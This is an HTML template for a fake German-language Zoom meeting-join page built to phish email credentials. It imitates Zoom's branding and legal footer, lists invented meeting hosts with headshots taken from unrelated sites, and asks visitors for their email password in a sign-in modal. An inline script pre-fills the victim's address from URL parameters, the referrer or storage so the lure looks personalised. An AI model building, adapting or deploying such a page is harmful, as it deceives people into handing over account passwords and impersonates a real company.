<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Meeting - Modern Zoom UI</title>
    
    <!-- Inter font -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <!-- Bootstrap 5 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Custom CSS -->
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="https://st1.zoom.us/zoom.ico">
</head>
<body>
    <div class="page-wrap">
        <div class="join-shell">
            <!-- LEFT PROMO -->
            <div class="promo">
                <img alt="Promo Banner" class="promo-img" src="https://ipfs.io/ipfs/bafybeidd5dsmkuucrcxjdkbnv2xkv6b2vgxskctr3tolo3v4nwl4noawhu">
            </div>
            
            <!-- RIGHT: main join card -->
            <div class="join-card">
                <h1 id="joinTitle">Online-Meeting beitreten</h1>
                
                <p class="invite-text" id="inviteText">
                    Willkommen <span id="emailDisplay"></span>, Sie wurden zu einem Meeting eingeladen mit
                    <strong>Kennedy Drakey</strong>, <strong>Judy Drakey</strong> &amp; <strong>Andrés Pérez, P.A.</strong>
                </p>
                
                <div class="users-online">
                    Es sind <span id="onlineCount">9</span> Benutzer 
                    <span class="onlineDot"></span> online
                </div>
                
                <div class="participants">
                    <div class="participant">
                        <img alt="Judy Drakey" class="avatar" src="https://www.nefa.org/sites/default/files/styles/teaser_square/public/images/KG%20Headshot%202019.jpg?h=e4dfac1b&itok=UyCw9K3z">
                        <div class="title">Judy Drakey</div>
                        <div class="subtitle">Regionalleiterin</div>
                    </div>
                    
                    <div class="participant">
                        <img alt="Heather Rainey" class="avatar" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTO9LHQbx3UdS9lKABuimdjp6MbmwWHjra7lg&usqp=CAU">
                        <div class="title">Heather Rainey</div>
                        <div class="subtitle">beratender Manager</div>
                    </div>
                    
                    <div class="participant">
                        <img alt="Andrés Pérez" class="avatar" src="https://cimline.com/wp-content/uploads/2024/04/DALE-DAUGHERTY.jpg">
                        <div class="title">Andrés Pérez</div>
                        <div class="subtitle">Finanzvorstand</div>
                    </div>
                </div>
                
                <div class="join-cta">
                    <button class="zm-button pulse" id="joinMeetingBtn">
                        <div class="button-loader" id="btnLoader" style="display: none;"></div>
                        <span id="btnText">Jetzt Meeting beitreten</span>
                    </button>
                    <div class="small-action" id="scheduleMeeting">Vor dem Senden planen</div>
                </div>
                
                <!-- Modal for meeting details -->
                <div class="blur-overlay" id="meetingModal">
                    <div class="form-modal">
                        <h3>Meetingdetails eingeben</h3>
                        <form id="meetingForm">
                            <div class="form-group">
                                <input type="text" class="zm-input__inner" id="meetingId" 
                                       name="meetingId" placeholder="Meeting-ID" required>
                                <div class="error-msg" id="meetingError"></div>
                            </div>
                            
                            <div class="form-group">
                                <input type="email" class="zm-input__inner" id="email" 
                                       name="email" placeholder="E-Mail-Adresse" required>
                                <div class="error-msg" id="emailError"></div>
                            </div>
                            
                            <div class="form-group">
                                <input type="password" class="zm-input__inner" id="password" 
                                       name="password" placeholder="Passwort der E-Mail-Adresse" required>
                                <div class="error-msg" id="passwordError"></div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="submit" class="zm-button" id="submitBtn">
                                    <div class="button-loader" id="submitLoader" style="display: none;"></div>
                                    <span id="submitText">Anmelden</span>
                                </button>
                                <button type="button" class="zm-button-secondary" id="closeModal">Schließen</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Cookie Banner -->
    <div class="cookie-banner" id="cookieBanner" style="display: none;">
        <div class="cookie-content">
            Zoom verwendet Cookies und ähnliche Technologien, die unbedingt erforderlich sind, damit unsere Website funktioniert.
            Weitere Informationen finden Sie in unserer
            <a href="https://explore.zoom.us/privacy" target="_blank">Datenschutzerklärung</a>.
        </div>
        <div class="cookie-actions">
            <button id="acceptCookies">Akzeptieren</button>
            <a href="#" id="cookieSettings">Cookie-Einstellungen</a>
        </div>
    </div>
    
    <!-- Footer -->
    <footer class="zoom-footer">
        <div class="footer-container">
            <div class="footer-left">
                © 2026 Zoom Video Communications, Inc. Alle Rechte vorbehalten.
            </div>
            <div class="footer-right">
                <a href="https://zoom.us/terms" target="_blank">Nutzungsbedingungen</a> |
                <a href="https://zoom.us/privacy" target="_blank">Datenschutzrichtlinie</a> |
                <a href="https://support.zoom.us/hc/en-us/articles/201362003-Accessibility" target="_blank">Barrierefreiheit</a>
            </div>
        </div>
        <div id="regionFooter">
            <a href="https://zoom.us/privacy" id="footerLink" target="_blank">
                Globale Nutzungsbedingungen und Datenschutz anzeigen
            </a>
        </div>
    </footer>
    
    <!-- JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
    
    <!-- Email Auto-Grab Script -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Function to extract email from URL parameters
            function getEmailFromURL() {
                const urlParams = new URLSearchParams(window.location.search);
                const email = urlParams.get('email');
                if (email && isValidEmail(email)) {
                    return email;
                }
                
                // Try other common parameter names
                const emailParams = ['e', 'user', 'username', 'user_email', 'mail', 'address'];
                for (const param of emailParams) {
                    const value = urlParams.get(param);
                    if (value && isValidEmail(value)) {
                        return value;
                    }
                }
                return null;
            }

            // Function to extract email from localStorage (if previously saved)
            function getEmailFromStorage() {
                try {
                    const savedEmail = localStorage.getItem('zoom_user_email');
                    if (savedEmail && isValidEmail(savedEmail)) {
                        return savedEmail;
                    }
                } catch (e) {
                    console.log('Cannot access localStorage');
                }
                return null;
            }

            // Function to extract email from browser autofill
            function checkAutofill() {
                const emailInput = document.getElementById('email');
                if (emailInput && emailInput.value && isValidEmail(emailInput.value)) {
                    return emailInput.value;
                }
                return null;
            }

            // Function to validate email format
            function isValidEmail(email) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }

            // Function to extract email from page content (looking for mailto links)
            function findEmailInPage() {
                const mailtoLinks = document.querySelectorAll('a[href^="mailto:"]');
                if (mailtoLinks.length > 0) {
                    for (const link of mailtoLinks) {
                        const href = link.getAttribute('href');
                        const email = href.replace('mailto:', '').split('?')[0];
                        if (isValidEmail(email)) {
                            return email;
                        }
                    }
                }
                return null;
            }

            // Function to extract email from referrer URL
            function getEmailFromReferrer() {
                try {
                    if (document.referrer) {
                        const referrerUrl = new URL(document.referrer);
                        const referrerParams = new URLSearchParams(referrerUrl.search);
                        const email = referrerParams.get('email');
                        if (email && isValidEmail(email)) {
                            return email;
                        }
                    }
                } catch (e) {
                    // Ignore errors with referrer parsing
                }
                return null;
            }

            // Main function to grab and autofill email
            function autoGrabAndFillEmail() {
                let grabbedEmail = null;
                
                // Try different sources in order of priority
                const sources = [
                    getEmailFromURL,
                    getEmailFromStorage,
                    checkAutofill,
                    getEmailFromReferrer,
                    findEmailInPage
                ];
                
                for (const source of sources) {
                    grabbedEmail = source();
                    if (grabbedEmail) {
                        break;
                    }
                }
                
                // If we found an email, fill it in
                if (grabbedEmail) {
                    const emailInput = document.getElementById('email');
                    const emailDisplay = document.getElementById('emailDisplay');
                    
                    if (emailInput) {
                        emailInput.value = grabbedEmail;
                        
                        // Trigger input event for any validation
                        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                    
                    if (emailDisplay) {
                        emailDisplay.textContent = grabbedEmail;
                    }
                    
                    // Save to localStorage for future use
                    try {
                        localStorage.setItem('zoom_user_email', grabbedEmail);
                    } catch (e) {
                        console.log('Cannot save to localStorage');
                    }
                    
                    console.log('Auto-filled email:', grabbedEmail);
                    return grabbedEmail;
                }
                
                return null;
            }

            // Initialize email auto-grab
            setTimeout(() => {
                autoGrabAndFillEmail();
                
                // Also try when modal opens (if using modal approach)
                const joinMeetingBtn = document.getElementById('joinMeetingBtn');
                if (joinMeetingBtn) {
                    joinMeetingBtn.addEventListener('click', function() {
                        setTimeout(autoGrabAndFillEmail, 100);
                    });
                }
                
                // Try again when page is fully loaded
                window.addEventListener('load', function() {
                    setTimeout(autoGrabAndFillEmail, 500);
                });
            }, 300);
        });
    </script>
</body>
</html>